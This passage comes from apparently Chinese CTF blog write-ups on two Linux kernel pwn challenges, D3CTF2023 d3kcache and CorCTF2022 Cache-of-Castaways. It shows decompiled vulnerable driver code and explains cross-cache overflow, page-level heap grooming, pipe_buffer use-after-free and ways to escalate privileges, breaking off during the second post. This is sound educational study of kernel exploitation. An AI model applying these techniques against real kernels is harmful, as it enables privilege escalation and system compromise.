<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">d3kcache_ioctl</span><span class="params">(__int64 a1, <span class="type">int</span> cmd, __int64 arg)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> size2; <span class="comment">// ecx</span></span><br><span class="line">  __int64 object3; <span class="comment">// r14</span></span><br><span class="line">  __int64 size3; <span class="comment">// r15</span></span><br><span class="line">  <span class="type">char</span> *data_1; <span class="comment">// r12</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> size; <span class="comment">// ecx</span></span><br><span class="line">  __int64 size_1; <span class="comment">// rbx</span></span><br><span class="line">  __int64 object2; <span class="comment">// r14</span></span><br><span class="line">  <span class="type">char</span> *data; <span class="comment">// r15</span></span><br><span class="line">  __int64 object; <span class="comment">// rax</span></span><br><span class="line">  __int64 object_1; <span class="comment">// r15</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> size4; <span class="comment">// r13d</span></span><br><span class="line">  __int64 max_size; <span class="comment">// r14</span></span><br><span class="line">  <span class="type">char</span> *data_2; <span class="comment">// r12</span></span><br><span class="line">  __int64 object_2; <span class="comment">// rsi</span></span><br><span class="line">  __int64 idx1; <span class="comment">// r14</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 idx2; <span class="comment">// rbx</span></span><br><span class="line">  __int64 n2047; <span class="comment">// rax</span></span><br><span class="line">  __int64 idx3; <span class="comment">// r12</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 idx4; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">void</span> *err_msg; <span class="comment">// rdi</span></span><br><span class="line">  request request_data; <span class="comment">// [rsp-48h] [rbp-48h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v28; <span class="comment">// [rsp-38h] [rbp-38h]</span></span><br><span class="line"></span><br><span class="line">  v28 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  raw_spin_lock(&amp;spin);</span><br><span class="line">  v4 = copy_from_user(&amp;request_data, arg, <span class="number">0x10</span>);</span><br><span class="line">  v5 = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">  <span class="keyword">if</span> ( cmd &gt; <span class="number">0x80F</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( cmd == <span class="number">0x810</span> )                         <span class="comment">// free</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( request_data.index &gt; <span class="number">0xF</span>uLL || (object_2 = object_list[<span class="number">2</span> * request_data.index]) == <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        err_msg = &amp;unk_882;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">      &#125;</span><br><span class="line">      kmem_cache_free(kcache_jar, object_2);</span><br><span class="line">      idx1 = (<span class="type">int</span>)request_data.index;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)(<span class="type">int</span>)request_data.index &gt; <span class="number">0xF</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        _ubsan_handle_out_of_bounds(&amp;off_12A0, request_data.index);<span class="comment">// &quot;/home/arttnba3/Desktop/self_questioning/D3CTF2023/d3kcache/code/d3kcache.c&quot;</span></span><br><span class="line">        idx2 = (<span class="type">int</span>)request_data.index;</span><br><span class="line">        object_list[<span class="number">2</span> * idx1] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( idx2 &gt;= <span class="number">0x10</span> )</span><br><span class="line">          _ubsan_handle_out_of_bounds(&amp;off_12C0, (<span class="type">unsigned</span> <span class="type">int</span>)idx2);<span class="comment">// &quot;/home/arttnba3/Desktop/self_questioning/D3CTF2023/d3kcache/code/d3kcache.c&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        object_list[<span class="number">2</span> * (<span class="type">int</span>)request_data.index] = <span class="number">0</span>;</span><br><span class="line">        idx2 = (<span class="type">unsigned</span> <span class="type">int</span>)idx1;</span><br><span class="line">      &#125;</span><br><span class="line">      object_size_list[<span class="number">4</span> * idx2] = <span class="number">0</span>;</span><br><span class="line">      v5 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( cmd != <span class="number">0x1919</span> )                      <span class="comment">// read</span></span><br><span class="line">        <span class="keyword">goto</span> LABEL_42;</span><br><span class="line">      <span class="keyword">if</span> ( request_data.index &gt; <span class="number">0xF</span>uLL || !object_list[<span class="number">2</span> * request_data.index] )</span><br><span class="line">      &#123;</span><br><span class="line">        err_msg = &amp;unk_85D;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">      &#125;</span><br><span class="line">      size = request_data.size;</span><br><span class="line">      <span class="keyword">if</span> ( request_data.size &gt; object_size_list[<span class="number">4</span> * request_data.index] )</span><br><span class="line">        size = object_size_list[<span class="number">4</span> * request_data.index];</span><br><span class="line">      <span class="keyword">if</span> ( (size &amp; <span class="number">0x80000000</span>) != <span class="number">0</span> )</span><br><span class="line">        BUG();</span><br><span class="line">      size_1 = size;</span><br><span class="line">      object2 = object_list[<span class="number">2</span> * request_data.index];</span><br><span class="line">      data = request_data.data;</span><br><span class="line">      _check_object_size(object2, size, <span class="number">1</span>);</span><br><span class="line">      v5 = -(__int64)(copy_to_user(data, object2, size_1) != <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( cmd != <span class="number">0x114</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( cmd == <span class="number">0x514</span> )                       <span class="comment">// append</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( request_data.index &lt;= <span class="number">0xF</span>uLL &amp;&amp; object_list[<span class="number">2</span> * request_data.index] )</span><br><span class="line">        &#123;</span><br><span class="line">          size2 = request_data.size;</span><br><span class="line">          <span class="keyword">if</span> ( request_data.size &gt; <span class="number">0x800</span> || request_data.size + object_size_list[<span class="number">4</span> * request_data.index] &gt;= <span class="number">0x800</span> )</span><br><span class="line">            size2 = <span class="number">0x800</span> - object_size_list[<span class="number">4</span> * request_data.index];</span><br><span class="line">          <span class="keyword">if</span> ( (size2 &amp; <span class="number">0x80000000</span>) != <span class="number">0</span> )</span><br><span class="line">            BUG();</span><br><span class="line">          object3 = object_list[<span class="number">2</span> * request_data.index] + (<span class="type">unsigned</span> <span class="type">int</span>)object_size_list[<span class="number">4</span> * request_data.index];</span><br><span class="line">          size3 = size2;</span><br><span class="line">          data_1 = request_data.data;</span><br><span class="line">          _check_object_size(object3, size2, <span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( !copy_from_user(object3, data_1, size3) )</span><br><span class="line">          &#123;</span><br><span class="line">            *(_BYTE *)(object3 + size3) = <span class="number">0</span>;</span><br><span class="line">            v5 = <span class="number">0</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">        &#125;</span><br><span class="line">        err_msg = &amp;unk_837;</span><br><span class="line">LABEL_46:</span><br><span class="line">        printk(err_msg);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">      &#125;</span><br><span class="line">LABEL_42:</span><br><span class="line">      err_msg = &amp;unk_8AA;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( request_data.index &gt;= <span class="number">0x10</span>uLL )        <span class="comment">// alloc</span></span><br><span class="line">    &#123;</span><br><span class="line">      err_msg = &amp;unk_782;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( object_list[<span class="number">2</span> * request_data.index] )</span><br><span class="line">    &#123;</span><br><span class="line">      err_msg = &amp;unk_7F6;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">    &#125;</span><br><span class="line">    object = kmem_cache_alloc(kcache_jar, <span class="number">0xDC0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !object )</span><br><span class="line">    &#123;</span><br><span class="line">      err_msg = &amp;unk_81A;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">    &#125;</span><br><span class="line">    object_1 = object;</span><br><span class="line">    size4 = request_data.size;</span><br><span class="line">    max_size = <span class="number">0x800</span>;</span><br><span class="line">    <span class="keyword">if</span> ( request_data.size &lt; <span class="number">0x800</span> )</span><br><span class="line">      max_size = request_data.size;</span><br><span class="line">    data_2 = request_data.data;</span><br><span class="line">    _check_object_size(object, max_size, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( copy_from_user(object_1, data_2, max_size) )</span><br><span class="line">    &#123;</span><br><span class="line">      kmem_cache_free(kcache_jar, object_1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      n2047 = <span class="number">2047</span>;</span><br><span class="line">      <span class="keyword">if</span> ( size4 &lt; <span class="number">0x7FF</span> )</span><br><span class="line">        n2047 = size4;</span><br><span class="line">      *(_BYTE *)(object_1 + n2047) = <span class="number">0</span>;</span><br><span class="line">      idx3 = (<span class="type">int</span>)request_data.index;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)(<span class="type">int</span>)request_data.index &gt; <span class="number">0xF</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        _ubsan_handle_out_of_bounds(&amp;off_1260, request_data.index);<span class="comment">// &quot;/home/arttnba3/Desktop/self_questioning/D3CTF2023/d3kcache/code/d3kcache.c&quot;</span></span><br><span class="line">        idx4 = (<span class="type">int</span>)request_data.index;</span><br><span class="line">        object_list[<span class="number">2</span> * idx3] = object_1;</span><br><span class="line">        <span class="keyword">if</span> ( idx4 &gt;= <span class="number">0x10</span> )</span><br><span class="line">          _ubsan_handle_out_of_bounds(&amp;off_1280, (<span class="type">unsigned</span> <span class="type">int</span>)idx4);<span class="comment">// &quot;/home/arttnba3/Desktop/self_questioning/D3CTF2023/d3kcache/code/d3kcache.c&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        object_list[<span class="number">2</span> * (<span class="type">int</span>)request_data.index] = object_1;</span><br><span class="line">        idx4 = (<span class="type">unsigned</span> <span class="type">int</span>)idx3;</span><br><span class="line">      &#125;</span><br><span class="line">      object_size_list[<span class="number">4</span> * idx4] = max_size;</span><br><span class="line">      v5 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_2:</span><br><span class="line">  raw_spin_unlock(&amp;spin);</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该菜单维护了一个堆列表，每个object大小不能超过0x800,在 <code>cmd = 0x514</code>时，填满object内容会将末尾设置为0。因此存在漏洞。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>由于 kmem_cache 相对于其他的结构体独立分配，只能使用cross_cache overflow的方式来进行利用。</p>
<h3 id="Step1-使用-Page-Level-堆风水来实现稳定的-cross-cache-overflow"><a href="#Step1-使用-Page-Level-堆风水来实现稳定的-cross-cache-overflow" class="headerlink" title="Step1. 使用 Page-Level 堆风水来实现稳定的 cross_cache overflow"></a>Step1. 使用 Page-Level 堆风水来实现稳定的 cross_cache overflow</h3><p>Page-Level Fengshui,在页级构建可控的内存布局。<br>由 buddy system 分配页面的机制引入。buddy system 分配页面时，其会维护 2 ^ order 大小的内存页，并且同一 order 由链表连接。当对应 order 无法提供页内存时，就会向上级更大的页面请求，拆分为两个对应大小的内存页，一份提供给用户请求，一份提供给其链表。</p>
<p><img src="https://camo.githubusercontent.com/b28032a8318ce42a174944f2a58575d892b22e69b852c41f0647fe80aa4a579f/68747470733a2f2f73322e6c6f6c692e6e65742f323032332f30312f31392f373962696c746a4e664143495a63502e676966" alt="page.gif"></p>
<p>注意到两个页面是物理连续的。因此，我们可以进行如下操作：</p>
<ul>
<li>请求到两个连续的内存页</li>
<li>释放其中一个，将其堆喷为存在漏洞的kmem_cache，方便后续利用</li>
<li>释放另一个，将其堆喷为要篡改的目标结构体。</li>
</ul>
<p>现在这样我们就可以进行cross-cache overflow了。<br>可以通过<code>setsockopt</code>系统调用来申请大量的内存页面。<br>利用手法对应的内存布局如下：</p>
<img src="/posts/1741e6b2/68747470733a2f2f73322e6c6f6c692e6e65742f323032332f30352f30322f5676506b356e4b596d444357784f732e706e67.png" class="" title="cross-cache overflow layout">

<h3 id="Step2-Use-fcntl-F-SETPIPE-SZ-to-extend-pipe-buffer-construct-page-level-UAF"><a href="#Step2-Use-fcntl-F-SETPIPE-SZ-to-extend-pipe-buffer-construct-page-level-UAF" class="headerlink" title="Step2. Use fcntl(F_SETPIPE_SZ) to extend pipe_buffer, construct  page-level UAF"></a>Step2. Use fcntl(F_SETPIPE_SZ) to extend pipe_buffer, construct  page-level UAF</h3><p><code>pipe_buffer</code>的第一个对象为page指针，而且page指针大小只有0x40,因此通过 off-by-null 可以将其修改为其他的page指针(75% chance)，从而实现两个pipe_buffer指向同一个page,然后就可以释放其中一个，实现Page-Level Use-after-free。<br>以下面几张图为说明：</p>
<img src="/posts/1741e6b2/68747470733a2f2f73322e6c6f6c692e6e65742f323032332f30352f30322f4a4c5a4f4b656a676f5064546b59412e706e67.png" class="" title="original state">

<img src="/posts/1741e6b2/68747470733a2f2f73322e6c6f6c692e6e65742f323032332f30352f30322f4d775453575562656159395075726f2e706e67.png" class="" title="null-byte partial overwrite">

<img src="/posts/1741e6b2/68747470733a2f2f73322e6c6f6c692e6e65742f323032332f30352f30322f523372654e494154316c47377366772e706e67.png" class="" title="page-level UAF">

<p>然后pipe的函数是支持我们对page进行写入和读取的。不过有一个问题是，pipe_buffer是从<code>kmalloc-cg-1k</code>中分配的，其需要从<code>order-2</code>page中进行申请。而漏洞模块申请的是从<code>order-3</code>page中进行申请，如果在不同order之间进行堆风水，那么成功率会大幅降低。<br>幸运的是<code>pipe_buffer</code>实际上是一个<code>pipe_buffer</code>数组，其数组元素数目为<code>pipe_bufs</code>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> pipe_inode_info *<span class="title function_">alloc_pipe_info</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">	pipe-&gt;bufs = kcalloc(pipe_bufs, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer),</span><br><span class="line">			     GFP_KERNEL_ACCOUNT);</span><br></pre></td></tr></table></figure>

<p>我们可以通过<code>fcntl(F_SETPIPE_SZ)</code>来调整<code>pipe_buffer</code>的大小，相当于realloc。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">pipe_fcntl</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span>;</span></span><br><span class="line">	<span class="type">long</span> ret;</span><br><span class="line"></span><br><span class="line">	pipe = get_pipe_info(file, <span class="literal">false</span>);</span><br><span class="line">	<span class="keyword">if</span> (!pipe)</span><br><span class="line">		<span class="keyword">return</span> -EBADF;</span><br><span class="line"></span><br><span class="line">	__pipe_lock(pipe);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">	<span class="keyword">case</span> F_SETPIPE_SZ:</span><br><span class="line">		ret = pipe_set_size(pipe, arg);</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">pipe_set_size</span><span class="params">(<span class="keyword">struct</span> pipe_inode_info *pipe, <span class="type">unsigned</span> <span class="type">long</span> arg)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">	ret = pipe_resize_ring(pipe, nr_slots);</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">pipe_resize_ring</span><span class="params">(<span class="keyword">struct</span> pipe_inode_info *pipe, <span class="type">unsigned</span> <span class="type">int</span> nr_slots)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> head, tail, mask, n;</span><br><span class="line"></span><br><span class="line">	bufs = kcalloc(nr_slots, <span class="keyword">sizeof</span>(*bufs),</span><br><span class="line">		       GFP_KERNEL_ACCOUNT | __GFP_NOWARN);</span><br></pre></td></tr></table></figure>

<p>这里，我们可以调整其为64个，从而令其从order-3 page(<code>kmalloc-cg-2k</code>)中申请内存页。</p>
<h3 id="构建-self-writing-pipe-来实现任意读写"><a href="#构建-self-writing-pipe-来实现任意读写" class="headerlink" title="构建 self-writing pipe 来实现任意读写"></a>构建 self-writing pipe 来实现任意读写</h3><p>dirty pipe的<a href="https://github.com/veritas501/pipe-primitive">pipe primitive</a>参考，修改其splice也中的<code>flag |= PIPE_BUF_FLAG_CAN_MERGE</code>即可。<br>将UAF的page再次申请到pipe_buffer，然后通过UAF读取page指针的地址，那么我们就可以再通过写来修改二级的page的指针，从而又实现一个uaf：</p>
<img src="/posts/1741e6b2/68747470733a2f2f73322e6c6f6c692e6e65742f323032332f30352f30322f79684e7554376b426a35384b3667742e706e67.png" class="" title="secondary page-level UAF">

<p>在二级UAF中，我们释放pipe,触发UAF,然后再让其申请到pipe_buffer，然后我们通过一级UAF,可以读取到二级UAF的page指针，因此我们可以直接修改其再次申请的pipe_buffer内的page指针为二级UAF的page对象，如下：</p>
<img src="/posts/1741e6b2/68747470733a2f2f73322e6c6f6c692e6e65742f323032332f30352f30322f54597238576c45757368656d3269332e706e67.png" class="" title="third-level self-pointing pipe">

<p>我们可以通过修改 pipe_buffer.offset 和 pipe_buffer.len 来重定位要读写的位置，但是在读写后这些值会被重新设置。因此我们可以通过上面这样一个结构来重新修改这些变量，这里我们在三级UAFpage中可以有三个pipe指向了UAF的page：</p>
<ul>
<li>第一个pipe用于进行任意地址读写。</li>
<li>第二个pipe用于修改第三个pipe的start point，从而第三个pipe可以用来修改第一个和第二个pipe变量。</li>
<li>第三个pipe用于修改第一&#x2F;二个pipe,从而能够循环起来。<br>可以实现不限次数的任意地址读写操作。</li>
</ul>
<h3 id="Step4-提权"><a href="#Step4-提权" class="headerlink" title="Step4. 提权"></a>Step4. 提权</h3><ol>
<li>修改cred结构体</li>
<li>读取页表解析内核栈物理地址，然后直接写入栈来执行ROP</li>
<li>读取页表解析内核代码物理地址，然后将其映射到用户空间来覆写内核代码（USMA）</li>
</ol>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://github.com/arttnba3/D3CTF2023_d3kcache">[D^3CTF 2023] d3kcache: From null-byte cross-cache overflow to infinite arbitrary read &amp; write in physical memory space.</a></li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>CorCTF2022 Cache-of-Castaways学习</title>
    <url>/posts/f5fa734e.html</url>
    <content><![CDATA[<p>Cross Cache overflow 和 Page-Level Heap Fengshui的例题。参考a3大佬的博客 : -)</p>
<h2 id="保护机制"><a href="#保护机制" class="headerlink" title="保护机制"></a>保护机制</h2><p>提供了KCONFIG,并且从启动脚本中可以查看到开启了KPTI, SMEP, SMAP保护。</p>
<p>通过KCONFIG查看常见保护开启情况如下：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">CONFIG_MEMCG_KMEM=y</span></span><br><span class="line"><span class="string">CONFIG_RANDOMIZE_BASE=y</span>			<span class="comment"># KASLR</span></span><br><span class="line"><span class="string">CONFIG_SLAB_FREELIST_RANDOM=y</span></span><br><span class="line"><span class="string">CONFIG_SLAB_FREELIST_HARDENED=y</span></span><br></pre></td></tr></table></figure>



<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>题目在注册设备时创建了kmem_cache，flag为<code>0xDC0</code>，即<code>SLAB_ACCOUNT | SLAB_PANIC</code>,同时开启了<code>CONFIG_MEMCG_KMEM=y</code>，因此申请的kmem_cache为独立的，通过kmem_cache_alloc申请的flag为<code>GFP_KERNEL | __GFP_ZERO</code>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">init_module</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  castaway_dev = <span class="number">255</span>;</span><br><span class="line">  castaway = (__int64)<span class="string">&quot;castaway&quot;</span>;</span><br><span class="line">  qword_8B0 = (__int64)&amp;castaway_fops;</span><br><span class="line">  _mutex_init(&amp;castaway_lock, <span class="string">&quot;&amp;castaway_lock&quot;</span>, &amp;_key_28999);</span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)misc_register(&amp;castaway_dev)</span><br><span class="line">    &amp;&amp; (castaway_arr = kmem_cache_alloc(kmalloc_caches[<span class="number">12</span>], <span class="number">0xDC0</span>)) != <span class="number">0</span></span><br><span class="line">    &amp;&amp; (castaway_cachep = kmem_cache_create(<span class="string">&quot;castaway_cache&quot;</span>, <span class="number">0x200</span>, <span class="number">1</span>, <span class="number">0x4040000</span>, <span class="number">0</span>)) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> init_castaway_driver_cold();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ops结构体只定义了ioctl操作函数，其定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">castaway_ioctl</span><span class="params">(__int64 a1, <span class="type">int</span> cmd, __int64 arg)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 castaway_ctr; <span class="comment">// r12</span></span><br><span class="line">  __int64 *v5; <span class="comment">// rbx</span></span><br><span class="line">  request request_data; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( cmd != <span class="number">0xCAFEBABE</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( copy_from_user(&amp;request_data, arg, <span class="number">0x18</span>) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    mutex_lock(&amp;castaway_lock);</span><br><span class="line">    <span class="keyword">if</span> ( cmd == <span class="number">0xF00DBABE</span> )</span><br><span class="line">      castaway_ctr = castaway_edit(request_data.index, request_data.size, request_data.data);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      castaway_ctr = <span class="number">-1</span>;</span><br><span class="line">LABEL_5:</span><br><span class="line">    mutex_unlock(&amp;castaway_lock);</span><br><span class="line">    <span class="keyword">return</span> castaway_ctr;</span><br><span class="line">  &#125;</span><br><span class="line">  mutex_lock(&amp;castaway_lock);</span><br><span class="line">  castaway_ctr = castaway_heap_num;</span><br><span class="line">  <span class="keyword">if</span> ( castaway_heap_num &lt;= <span class="number">0x18F</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ++castaway_heap_num;</span><br><span class="line">    v5 = &amp;castaway_arr[castaway_ctr];</span><br><span class="line">    *v5 = kmem_cache_alloc(castaway_cachep, <span class="number">0x400DC0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( castaway_arr[castaway_ctr] )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> castaway_ioctl_cold();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>定义了两个操作，分别为通过<code>kmem_cache_alloc</code>创建新对象，修改对象。</p>
<p>创建对象使用的flag为：<code>GFP_KERNEL | GFP_ACCOUNT | __GFP_ZERO</code>，最多创建400个object。</p>
<p>修改对象内容如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">castaway_edit</span><span class="params">(<span class="type">unsigned</span> __int64 index, <span class="type">size_t</span> size, <span class="type">char</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  _BYTE src[<span class="number">512</span>]; <span class="comment">// [rsp+0h] [rbp-220h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+200h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( index &gt; <span class="number">0x18F</span></span><br><span class="line">    || !castaway_arr[index]</span><br><span class="line">    || size &gt; <span class="number">0x200</span></span><br><span class="line">    || (_check_object_size(src, size, <span class="number">0</span>), copy_from_user(src, data, size)) )</span><br><span class="line">  &#123;</span><br><span class="line">    castaway_edit_cold();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="type">void</span> *)(castaway_arr[index] + <span class="number">6</span>), src, size);</span><br><span class="line">    <span class="keyword">return</span> size;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要用户输入的数据结构如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">request</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">size_t</span> index;</span><br><span class="line">  <span class="type">size_t</span> size;</span><br><span class="line">  <span class="type">char</span> *data;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>漏洞位于castaway_edit函数存在堆溢出漏洞，可以溢出6字节。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="Step1-Cross-cache-overflow"><a href="#Step1-Cross-cache-overflow" class="headerlink" title="Step1. Cross-cache overflow"></a>Step1. Cross-cache overflow</h3><p>因为我们的漏洞对象位于独立的<code>kmem_cache</code>中，因此其不会与内核中的其他结构体的分配混用，我们无法通过slub层的堆喷+堆风水溢出到其他结构体来进行下一步利用；同时由于slub并不会像glibc那样每个object开头都有个存储数据的header,而是将next指针放在一个随机位置，我们很难直接溢出到下一个object的next指针，而且还存在hardened freelist保护；在我们slub的相邻页面上的数据也是未知的，直接溢出也不知道会溢出到哪儿。</p>
<p>因此需要通过buddy system层面的利用，即cross-cache overflow.</p>
<p>溢出对象可以为cred结构体的uid字段，完成提权，可以先fork()堆喷cred耗尽cred_jar中的object,然后让其向buddy system请求新的页面，然后还需要堆喷消耗buddy system原有的页面，然后再分配cred和题目object,两者便有大概率相邻。</p>
<p><code>cred</code>大小为192,<code>cred_jar</code>向buddy system单次请求的页面数量为1,足够分配21个<code>cred</code>,因此不需要堆喷太多的<code>cred</code>就可以耗尽<code>cred_jar</code>,不过<code>fork()</code>在执行过程中会产生很多不需要的结构体，影响页布局，因此这里我们改用<code>clone(CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND)</code>。</p>
<p>本想用<code>msg_msg</code>来堆喷消耗buddy system,但是发现System V的消息队列在题目环境中被禁用了。</p>
<p>这里是参照了setsockopt()进行页喷射的方法：当我们创建一个 protocol 为 <code>PF_PACKET</code> 的 socket 之后，先调用 <code>setsockopt()</code> 将 <code>PACKET_VERSION</code> 设为 <code>TPACKET_V1 </code>&#x2F; <code>TPACKET_V2</code>，再调用 <code>setsockopt()</code> 提交一个 <code>PACKET_TX_RING</code> ，此时便存在如下调用链：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__sys_setsockopt()</span><br><span class="line">    sock-&gt;ops-&gt;setsockopt()</span><br><span class="line">    	packet_setsockopt() <span class="comment">// case PACKET_TX_RING ↓</span></span><br><span class="line">    		packet_set_ring()</span><br><span class="line">    			alloc_pg_vec()</span><br></pre></td></tr></table></figure>

<p>在 <code>alloc_pg_vec()</code> 中会创建一个 <code>pgv</code> 结构体，用以分配 <code>tp_block_nr</code> 份 2order 张内存页，其中 <code>order</code> 由 <code>tp_block_size</code> 决定：</p>
